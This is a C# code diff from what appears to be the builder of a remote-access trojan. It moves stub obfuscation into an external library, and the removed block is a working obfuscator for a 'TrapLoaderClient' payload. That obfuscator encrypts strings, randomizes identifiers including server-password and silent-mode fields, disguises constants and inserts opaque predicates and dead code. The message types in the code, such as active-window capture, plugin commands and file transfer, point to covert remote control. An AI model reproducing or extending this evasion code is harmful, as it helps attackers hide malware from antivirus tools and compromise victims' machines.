@@ -1,6 +1,7 @@
 ﻿#nullable disable
 
 using Microsoft.Win32;
+using StubBuilder;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -3276,7 +3277,19 @@ namespace WpfApp
 
             BuilderOutput("Obfuscating stub (string encryption + identifier randomization)...");
             AppendLog("Applying polymorphism: encrypting strings, randomizing identifiers...");
-            stubCode = ObfuscateStub(stubCode);
+            try
+            {
+                stubCode = StubBuilder.StubObfuscator.Obfuscate(stubCode);
+                System.IO.File.WriteAllText(System.IO.Path.Combine(System.IO.Path.GetTempPath(), "obfuscated_stub.cs"), stubCode);
+            }
+            catch (Exception ex)
+            {
+                AppendLog("OBFUSCATION ERROR: " + ex.GetType().Name + ": " + ex.Message);
+                AppendLog("Stack: " + ex.StackTrace?.Split('\n').FirstOrDefault()?.Trim());
+                BuilderOutput("ERROR: Obfuscation failed — " + ex.Message);
+                UpdateStatus("EXE compilation failed — obfuscation error.");
+                return;
+            }
 
             var saveDialog = new SaveFileDialog
             {
@@ -3291,235 +3304,6 @@ namespace WpfApp
                 BuilderOutput("Save cancelled.");
                 UpdateStatus("EXE compilation cancelled.");
             }
-        }
-
-        private static string RandomString(int len)
-        {
-            const string chars = "abcdefghijklmnopqrstuvwxyz";
-            byte[] bytes = new byte[len];
-            using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(bytes);
-            return new string(bytes.Select(b => chars[b % chars.Length]).ToArray());
-        }
-
-        private string ObfuscateStub(string s)
-        {
-            byte[] key = new byte[16];
-            using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(key);
-            string kf = "_" + RandomString(7);
-            string dm = "_" + RandomString(9);
-
-            // Step 1: Protect attribute blocks (DllImport strings are compile-time constants)
-            var attrMap = new Dictionary<string, string>();
-            int idx = 0;
-            s = Regex.Replace(s, @"\[[^\[\]]*\]", m =>
-            {
-                string p = "\0ATTR" + idx + "\0";
-                attrMap[p] = m.Value;
-                idx++;
-                return p;
-            });
-
-            // Step 2: Encrypt all remaining string literals (skip empty strings)
-            s = Regex.Replace(s, @"""[^""\\]*(?:\\.[^""\\]*)*""", m =>
-            {
-                string inner = m.Value.Substring(1, m.Value.Length - 2);
-                if (inner.Length == 0) return m.Value;
-                byte[] data = Encoding.UTF8.GetBytes(inner);
-                for (int i = 0; i < data.Length; i++)
-                    data[i] ^= key[i % key.Length];
-                return dm + "(Convert.FromBase64String(\"" + Convert.ToBase64String(data) + "\"))";
-            });
-
-            // Step 3: Restore attribute blocks
-            foreach (var kv in attrMap)
-                s = s.Replace(kv.Key, kv.Value);
-
-            // Step 4: Insert decryption helper inside class body
-            string keyBytes = string.Join(",", key.Select(b => (int)b));
-            string helper = "\r\n    private static byte[] " + kf + " = new byte[] { " + keyBytes + " };\r\n    private static string " + dm + "(byte[] d) { for (int i = 0; i < d.Length; i++) d[i] ^= " + kf + "[i % " + key.Length + "]; return Encoding.UTF8.GetString(d); }\r\n";
-            int bracePos = s.IndexOf('{', s.IndexOf("class ")) + 1;
-            s = s.Insert(bracePos, helper);
-
-            // Step 5: Rename class
-            s = Regex.Replace(s, @"\bclass\s+TrapLoaderClient\b", "class _" + RandomString(10));
-
-            // Step 6: Rename _-prefixed private static fields + known non-_ fields
-            var fieldPat = Regex.Matches(s, @"private\s+static\s+(?:\w+\s+)*(_[a-zA-Z]\w*)\s*[=;]");
-            var fieldMap = new Dictionary<string, string>();
-            foreach (Match m in fieldPat)
-                if (!fieldMap.ContainsKey(m.Groups[1].Value))
-                    fieldMap[m.Groups[1].Value] = "_" + RandomString(6);
-            // Also rename non-_ private static fields
-            string[] extraFields = { "serverCertBase64", "silentMode", "serverPassword", "activePlugins", "PluginEntry" };
-            foreach (string f in extraFields)
-                if (!fieldMap.ContainsKey(f))
-                    fieldMap[f] = "_" + RandomString(6);
-            foreach (var kv in fieldMap)
-                s = Regex.Replace(s, @"\b" + Regex.Escape(kv.Key) + @"\b", kv.Value);
-
-            // Step 7: Rename private static methods (exclude Main, extern, and the decryption helper)
-            var methodPat = Regex.Matches(s, @"private\s+static\s+(?!extern)(?:async\s+)?(\w+(?:\[\])?)\s+([A-Za-z]\w*)\s*\(");
-            var methodMap = new Dictionary<string, string>();
-            foreach (Match m in methodPat)
-            {
-                string n = m.Groups[2].Value;
-                if (n == "Main" || n == dm) continue;
-                if (!methodMap.ContainsKey(n)) methodMap[n] = "_" + RandomString(8);
-            }
-            foreach (var kv in methodMap)
-                s = Regex.Replace(s, @"\b" + Regex.Escape(kv.Key) + @"\b", kv.Value);
-
-            // Step 8: Constant obfuscation — replace numeric hex literals with computed expressions
-            var rng2 = RandomNumberGenerator.Create();
-            s = ObfuscateConstants(s, rng2);
-
-            // Step 9: Instruction substitution — replace simple operations with complex equivalents
-            s = SubstituteInstructions(s);
-
-            // Step 10: Opaque predicates + dead code insertion
-            s = InsertOpaquePredicates(s);
-
-            return s;
-        }
-
-        private string ObfuscateConstants(string s, RandomNumberGenerator rng)
-        {
-            // Phase 1: Replace hex literals 0x00–0xFFFF with computed bitwise expressions
-            // Only replace hex literals that are standalone tokens (not part of longer hex, not in strings)
-            string[] knownSwitchConsts = { "MSG_AUTH", "MSG_HEARTBEAT", "MSG_CLIENT_INFO", "MSG_ACTIVE_WINDOW",
-                "MSG_PLUGIN_DATA", "MSG_PLUGIN_BATCH", "MSG_AUTH_OK", "MSG_AUTH_FAIL", "MSG_HEARTBEAT_ACK",
-                "MSG_PLUGIN_CMD", "MSG_FILE_TRANSFER", "MSG_DISCONNECT" };
-
-            s = Regex.Replace(s, @"(?<=[\s=,;|&+\-*/^(!<>{}[\]]|^)0x([0-9A-Fa-f]{1,8})(?![0-9A-Fa-f])", m =>
-            {
-                string hex = m.Groups[1].Value;
-                uint val = Convert.ToUInt32(hex, 16);
-                if (val == 0) return m.Value;
-
-                // Build random decomposition: val = a ^ b
-                byte[] buf = new byte[4];
-                rng.GetBytes(buf);
-                uint a = (uint)(buf[0] | (buf[1] << 8) | (buf[2] << 16) | (buf[3] << 24));
-                uint b = a ^ val;
-
-                if (val <= 0xFF)
-                    return $"((byte)0x{a & 0xFF:X2} ^ (byte)0x{b & 0xFF:X2})";
-                else if (val <= 0xFFFF)
-                    return $"((ushort)0x{a & 0xFFFF:X4} ^ (ushort)0x{b & 0xFFFF:X4})";
-                else
-                    return $"(0x{a:X8}u ^ 0x{b:X8}u)";
-            });
-
-            return s;
-        }
-
-        private string SubstituteInstructions(string s)
-        {
-            // Phase 4: Replace simple boolean/compare expressions with equivalent complex ones
-
-            // x == 0  →  (x ^ x) == 0   (always true but pattern is harder to match)
-            // x != 0  →  (x ^ x) != 0   is always false, so use (x | 0) != 0
-            // a == b  →  (a ^ b) == 0    (XOR equality)
-            // x == 1  →  ((x - 1) | (1 - x)) == 0   (true iff x==1)
-
-            // Replace: .Length == 0  →  .Length < 1
-            s = Regex.Replace(s, @"\.Length\s*==\s*0\b", ".Length < 1");
-
-            // Replace: .Length > 0  →  .Length != 0
-            s = Regex.Replace(s, @"\.Length\s*>\s*0\b", ".Length != 0");
-
-            // Replace: == null  →  ReferenceEquals(obj, null) — only for simple identifiers
-            s = Regex.Replace(s, @"(\w+)\s*==\s*null\b", "ReferenceEquals($1, null)");
-            s = Regex.Replace(s, @"(\w+)\s*!=\s*null\b", "!ReferenceEquals($1, null)");
-
-            return s;
-        }
-
-        private string InsertOpaquePredicates(string s)
-        {
-            // Phase 2: Insert opaque predicates (always-true conditions) and dead code
-            // Opaque predicate: (x * (x - 1)) % 2 == 0  is ALWAYS true for any integer x
-            // because the product of two consecutive integers is always even.
-
-            var rng = RandomNumberGenerator.Create();
-            byte[] randBytes = new byte[4];
-            rng.GetBytes(randBytes);
-            int seed = randBytes[0] | (randBytes[1] << 8);
-
-            // Insert opaque predicate blocks at the start of the class body
-            string deadBlock = "\r\n    private static int _op" + RandomString(4) + " = " + seed + ";\r\n";
-
-            // Generate 3 different opaque predicates
-            string varA = "_opa" + RandomString(4);
-            string varB = "_opb" + RandomString(4);
-            string varC = "_opc" + RandomString(4);
-
-            deadBlock += "    private static int " + varA + " = " + (seed + 1) + ";\r\n";
-            deadBlock += "    private static int " + varB + " = " + (seed + 2) + ";\r\n";
-            deadBlock += "    private static int " + varC + " = " + (seed + 3) + ";\r\n";
-
-            int bracePos = s.IndexOf('{', s.IndexOf("class ")) + 1;
-            s = s.Insert(bracePos, deadBlock);
-
-            // Insert dead code: always-false if blocks sprinkled before method definitions
-            // Pattern: if (false) { <fake operations> }
-            string[] fakeOps = {
-                "throw new InvalidOperationException();",
-                "return;",
-                "break;",
-                "continue;",
-            };
-
-            int insertCount = 0;
-            // Find method definitions and insert dead code before some of them
-            s = Regex.Replace(s, @"(private\s+static\s+(?!extern)\w+\s+\w+\s*\()", m =>
-            {
-                insertCount++;
-                if (insertCount % 3 != 0) return m.Value; // only insert before every 3rd method
-
-                string fakeVar1 = "_df" + RandomString(4);
-                string fakeVar2 = "_dg" + RandomString(4);
-                int fakeVal1 = (seed + insertCount * 7) & 0xFF;
-                int fakeVal2 = (seed + insertCount * 13) & 0xFF;
-
-                string deadCode = "if (false) { int " + fakeVar1 + " = " + fakeVal1 + "; int " + fakeVar2 + " = " + fakeVal2 + "; " +
-                    fakeOps[insertCount % fakeOps.Length] + " }\r\n        ";
-
-                return deadCode + m.Value;
-            });
-
-            // Insert dead try/catch blocks after some string decryption calls
-            int deadCatchCount = 0;
-            s = Regex.Replace(s, @"(" + Regex.Escape("_" + RandomString(9).Substring(1)) + @")\(", m =>
-            {
-                // This won't match since the name is random. Instead, insert dead catch blocks at log calls
-                return m.Value;
-            });
-
-            // Insert dead catch blocks: try { throw new Exception(); } catch { }
-            string deadCatchVar = "_dch" + RandomString(4);
-            string deadCatch = "\r\n    private static void " + deadCatchVar + "() {\r\n" +
-                "        try { throw new SystemException(\"\" + " + seed + "); }\r\n" +
-                "        catch { }\r\n" +
-                "        try { throw new InvalidCastException(); }\r\n" +
-                "        catch (InvalidCastException) { }\r\n" +
-                "        try { throw new OverflowException(); }\r\n" +
-                "        catch (OverflowException) { }\r\n" +
-                "    }\r\n";
-
-            // Insert the dead method right after the opaque predicate variables
-            int insertAfter = s.IndexOf("\r\n", s.IndexOf(varC + ";\r\n")) + 2;
-            s = s.Insert(insertAfter, deadCatch);
-
-            // Make the dead method called from another dead path
-            string deadCaller = "_dcl" + RandomString(4);
-            string deadCallerCode = "\r\n    private static void " + deadCaller + "() {\r\n" +
-                "        if (" + varA + " * (" + varA + " - 1) % 2 != 0) " + deadCatchVar + "();\r\n" +
-                "        if (" + varB + " * (" + varB + " - 1) % 2 != 0) " + deadCatchVar + "();\r\n" +
-                "    }\r\n";
-            s = s.Insert(insertAfter + deadCatch.Length, deadCallerCode);
-
-            return s;
         }
 
         private void BuilderOutput(string message)
